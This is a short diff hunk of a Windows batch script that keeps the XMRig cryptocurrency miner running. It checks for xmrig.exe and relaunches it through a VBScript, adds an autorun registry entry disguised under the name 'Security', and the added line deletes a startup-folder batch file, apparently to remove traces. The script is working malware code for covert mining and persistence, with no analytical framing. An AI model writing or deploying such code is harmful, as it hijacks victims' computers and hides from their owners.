@@ -5,6 +5,7 @@ timeout 1
 tasklist /fi "ImageName eq xmrig.exe" /fo csv 2>NUL | find /I "xmrig.exe">NUL
 if "%ERRORLEVEL%"=="1" goto execute
 REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Security" /t REG_SZ /F /D "C:\ProgramData\PSU\start.vbs"
+del "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\bgin.bat"
 goto start
 :execute
 start "" "C:\ProgramData\PSU\execute.vbs"
